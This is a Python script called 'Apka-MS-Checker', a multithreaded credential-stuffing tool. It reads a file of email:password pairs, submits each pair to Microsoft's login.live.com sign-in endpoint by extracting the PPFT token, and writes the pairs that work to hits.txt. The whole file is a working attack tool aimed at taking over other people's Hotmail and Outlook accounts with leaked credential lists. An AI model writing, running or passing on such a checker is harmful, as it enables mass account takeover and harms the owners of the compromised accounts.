#!/usr/bin/env python3
"""
Simple Hotmail/Outlook Account Checker
"""

import os
import requests
import re
import sys
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import Fore, init

# ANSI colors for minimal output
GREEN = "\033[92m"
RED = "\033[91m"
CYAN = "\033[96m"
YELLOW = "\033[93m"
BOLD = "\033[1m"
RESET = "\033[0m"
red = Fore.RED
darkred = Fore.LIGHTBLACK_EX
white = Fore.WHITE
blue = Fore.BLUE
green = Fore.GREEN
yellow = Fore.YELLOW
lightyellow = Fore.LIGHTYELLOW_EX
cyan = Fore.CYAN
lcyan = Fore.LIGHTCYAN_EX
lmagenta = Fore.LIGHTMAGENTA_EX
rescolor = Fore.RESET
from datetime import datetime


def banner():
    print(fr"""{lcyan}
                            _                __  __  _____        _____ _               _             
                /\         | |              |  \/  |/ ____|      / ____| |             | |            
               /  \   _ __ | | ____ _ ______| \  / | (___ ______| |    | |__   ___  ___| | _____ _ __ 
              / /\ \ | '_ \| |/ / _` |______| |\/| |\___ \______| |    | '_ \ / _ \/ __| |/ / _ \ '__|
             / ____ \| |_) |   < (_| |      | |  | |____) |     | |____| | | |  __/ (__|   <  __/ |   
            /_/    \_\ .__/|_|\_\__,_|      |_|  |_|_____/       \_____|_| |_|\___|\___|_|\_\___|_|   
                     | |                                                                              
                     |_|                                                                              
    """)
    print(f"\t\t\t\t\t{lcyan}{BOLD}🔗 https://github.com/apkaless{rescolor}")
    print(f"\t\t\t\t\t{lcyan}{BOLD}🔗 https://instagram.com/apkaless{rescolor}")
    print("\n")

class SimpleHotmailChecker:
    def __init__(self, quiet=True):
        self.session = requests.Session()
        self.base_url = "https://login.live.com"
        self.quiet = quiet
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        })
    
    def log(self, message):
        if not self.quiet:
            print(message)
        
    
    
    def extract_ppft(self, html_content):
        """Extract PPFT token from HTML content"""
        # Try multiple patterns to find PPFT
        patterns = [
            r'<input[^>]*name="PPFT"[^>]*value="([^"]*)"',
            r'<input[^>]*name="PPFT"[^>]*value=\\"([^"]*)\\"',
            r'name="PPFT"[^>]*value="([^"]*)"',
            r'name="PPFT"[^>]*value=\\"([^"]*)\\"',
            r'PPFT.*?value="([^"]*)"',
            r'PPFT.*?value=\\"([^"]*)\\"'
        ]
        
        for pattern in patterns:
            match = re.search(pattern, html_content, re.IGNORECASE | re.DOTALL)
            if match:
                return match.group(1)
        
        return None
    
    def check_account_with_retry(self, email, password, max_retries=3):
        """Check account credentials with limited retries"""
        self.log("=" * 60)
        self.log("🔐 SIMPLE HOTMAIL/OUTLOOK CHECKER")
        self.log("=" * 60)
        self.log(f"📧 Email: {email}")
        self.log(f"🕐 Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        self.log("")
        attempts = 0
        while attempts < max_retries:
            attempts += 1
            try:
                result = self.check_account_single(email, password)
                if result is None:
                    self.log("⚠️  Temporary failure (e.g., rate limit). Retrying...")
                    continue
                return result
            except Exception as e:
                self.log(f"❌ Error during check attempt #{attempts}: {e}")
        self.log(f"❌ ALL ATTEMPTS FAILED for {email}")
        return False
    
    def check_account_single(self, email, password):
        """Check account credentials with single attempt"""
        try:
            # Step 1: Get initial login page
            self.log("🔍 Getting login page...")
            response = self.session.get(f"{self.base_url}/login.srf", timeout=30)
            
            if response.status_code != 200:
                self.log(f"❌ Failed to get login page: {response.status_code}")
                return None  # Return None to trigger retry
            
            # Step 2: Extract PPFT token
            self.log("🔑 Extracting PPFT token...")
            ppft = self.extract_ppft(response.text)
            
            if not ppft:
                self.log("❌ Could not extract PPFT token")
                return None  # Return None to trigger retry
            
            self.log(f"✅ PPFT token extracted: {ppft[:20]}...")
            
            # Step 3: Prepare login data
            login_data = {
                'ps': '2',
                'psRNGCDefaultType': '',
                'psRNGCEntropy': '',
                'psRNGCSLK': '',
                'canary': '',
                'ctx': '',
                'hpgrequestid': '',
                'PPFT': ppft,
                'PPSX': 'Passport',
                'NewUser': '1',
                'FoundMSAs': '',
                'fspost': '0',
                'i21': '0',
                'CookieDisclosure': '0',
                'IsFidoSupported': '1',
                'isSignupPost': '0',
                'isRecoveryAttemptPost': '0',
                'i13': '0',
                'login': email,
                'loginfmt': email,
                'type': '11',
                'LoginOptions': '3',
                'lrt': '',
                'lrtPartition': '',
                'hisRegion': '',
                'hisScaleUnit': '',
                'passwd': password
            }
            
            # Step 4: Make login request
            self.log("📤 Sending login request...")
            login_headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': self.base_url,
                'Referer': f"{self.base_url}/login.srf",
            }
            
            response = self.session.post(
                f"{self.base_url}/ppsecure/post.srf",
                data=login_data,
                headers=login_headers,
                allow_redirects=True,
                timeout=30
            )
            
            self.log(f"📥 Response received: {response.status_code}")
            self.log(f"🔗 Final URL: {response.url}")
            # Step 5: Analyze response
            return self.analyze_response(response)
            
        except requests.exceptions.ProxyError as e:
            self.log(f"❌ Network proxy error: {e}")
            return None  # Return None to trigger retry
        except requests.exceptions.ConnectionError as e:
            error_msg = str(e).lower()
            self.log(f"❌ Connection error: {e}")
            return None  # Return None to trigger retry
        except requests.exceptions.Timeout as e:
            self.log(f"❌ Timeout error: {e}")
            return None  # Return None to trigger retry
        except Exception as e:
            error_msg = str(e).lower()
            self.log(f"❌ Error: {e}")
            return False  # Return False for other errors (don't retry)
    
    def analyze_response(self, response):
        """Analyze login response"""
        response_text = response.text.lower()
        final_url = response.url.lower()
        
        # Check for rate limiting (HTTP 429)
        if response.status_code == 429:
            self.log("🚫 Rate limit detected (HTTP 429) - Too Many Requests")
            self.log("   Request was rate limited; will retry if allowed")
            return None  # Return None to trigger retry
        
        # Check for JavaScript redirect (common with Microsoft)
        if 'javascript required to sign in' in response_text:
            self.log("⚠️  JavaScript redirect detected - this usually means login was successful")
            self.log("   Microsoft often uses JavaScript redirects for successful logins")
            return True
        
        # Check for success indicators
        success_indicators = [
            'outlook.com',
            'mail.live.com',
            'account.microsoft.com',
            'welcome',
            'dashboard',
            'inbox',
            'sign out',
            'account settings'
        ]
        
        # Check for error indicators
        error_indicators = [
            'incorrect username or password',
            'incorrect',
            'invalid',
            'wrong',
            'microsoft account is unavailable',
            'server_error',
            'contextid supplied in the request did not have a matching cookie',
            'sign in'
        ]
        
        # Check for specific errors first
        for error in error_indicators:
            if error in response_text:
                self.log(f"❌ Login failed: {error}")
                return False
        
        # Check for success
        for success in success_indicators:
            if success in final_url or success in response_text:
                self.log(f"✅ Login successful! Found: {success}")
                return True
        
        # Check for redirect patterns
        if 'refresh' in response_text and 'url=' in response_text:
            self.log("⚠️  Redirect detected - checking destination...")
            # Extract redirect URL
            redirect_match = re.search(r'url=([^"]*)', response_text)
            if redirect_match:
                redirect_url = redirect_match.group(1)
                self.log(f"   Redirect URL: {redirect_url}")
                if any(domain in redirect_url for domain in ['outlook.com', 'mail.live.com', 'account.microsoft.com']):
                    self.log("✅ Login successful! Redirected to Microsoft service")
                    return True
        
        # If unclear, show some response details
        self.log("⚠️  Login status unclear")
        self.log(f"Final URL: {response.url}")
        self.log(f"Response preview: {response_text[:200]}...")
        return False
    
    
    

def main(save_path: str):
    """Main function"""
    banner()
    # Prepare checker (no proxy)
    checker = SimpleHotmailChecker()
    
    results = []
    
    combo_path = input(f"{lcyan}[📄]{rescolor} Path to combo file (email:password): ").strip()
    try:
        with open(combo_path, 'r', encoding='utf-8', errors='ignore') as f:
            lines = [ln.strip() for ln in f if ln.strip() and not ln.strip().startswith('#')]
    except FileNotFoundError:
        print(f"\n{lcyan}[❌]{rescolor} Combo file not found: {combo_path}")
        return
    except Exception as e:
        print(f"\n{lcyan}[❌]{rescolor} Error reading combo file: {e}")
        return
    
    print(f"\n{lcyan}[📦]{rescolor} {GREEN}Loaded {len(lines)} combos{rescolor}")
    
    # Ask for thread count
    try:
        threads_input = input(f"{lcyan}[🧵]{rescolor} Number of threads (default 10): ").strip()
        num_threads = int(threads_input) if threads_input else 10
        if num_threads < 1:
            num_threads = 1
    except Exception:
        num_threads = 10
    
    # Pre-parse valid entries
    parsed = []
    for idx, line in enumerate(lines, start=1):
        if ':' not in line:
            print(f"\n{lcyan}[⚠️]{rescolor} Skipping malformed line #{idx}: {line}")
            continue
        email, password = line.split(':', 1)
        email = email.strip()
        password = password.strip()
        if not email or not password:
            print(f"\n{lcyan}[⚠️]{rescolor} Skipping incomplete line #{idx}: {line}")
            continue
        parsed.append((idx, email, password))
    
    counters = {'checked': 0, 'hits': 0, 'fails': 0}
    lock = threading.Lock()
    print(f"\n{lcyan}[INFO]{rescolor} Starting checker with {num_threads} threads\n")
    print("\n")
    def process_one(item):
        idx, email, password = item
        local_checker = SimpleHotmailChecker(quiet=True)
        result = local_checker.check_account_with_retry(email, password, max_retries=3)
        with lock:
            results.append((email, result))
            counters['checked'] += 1
            if result:
                counters['hits'] += 1
                print(f"{GREEN}[HIT]{RESET} {email}:{password}")
                with open(os.path.join(save_path, 'hits.txt'), 'a', encoding='utf-8') as hits_file:
                    hits_file.write(f"{email}:{password}\n")
                    hits_file.flush()
            else:
                counters['fails'] += 1
                print(f"{RED}[FAIL]{RESET} {email}")
                with open(os.path.join(save_path, 'fails.txt'), 'a', encoding='utf-8') as fails_file:
                    fails_file.write(f"{email}:{password}\n")
                    fails_file.flush()
        return result
    
    # Execute in thread pool
    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        futures = [executor.submit(process_one, item) for item in parsed]
        for _ in as_completed(futures):
            pass
    
    print("\n" + ("=" * 60))
    print(f"{lcyan}📊 SUMMARY{rescolor}")
    print(f"Checked: {counters['checked']}{rescolor}")
    print(f"Hits:    {GREEN}{counters['hits']}{RESET}")
    print(f"Fails:   {RED}{counters['fails']}{RESET}")
    print(f"🕐 Completed: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{rescolor}")
    print("=" * 60)

if __name__ == "__main__":
    main(".")
